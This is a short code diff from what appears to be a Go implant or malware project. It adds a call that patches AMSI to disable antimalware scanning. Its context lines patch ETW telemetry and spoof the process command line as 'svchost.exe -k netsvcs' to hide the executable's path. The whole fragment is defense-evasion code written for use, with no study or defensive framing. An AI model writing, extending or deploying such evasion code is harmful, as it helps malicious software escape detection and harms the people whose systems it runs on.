@@ -84,6 +84,9 @@ func main() {
 	// Disable ETW telemetry before anything else
 	_ = ntapi.PatchETW()
 
+	// Disable AMSI scanning in our process
+	_ = ntapi.PatchAMSI()
+
 	// Spoof command line in PEB to hide our executable path
 	_ = ntapi.SpoofCommandLine("C:\\Windows\\System32\\svchost.exe -k netsvcs")
 
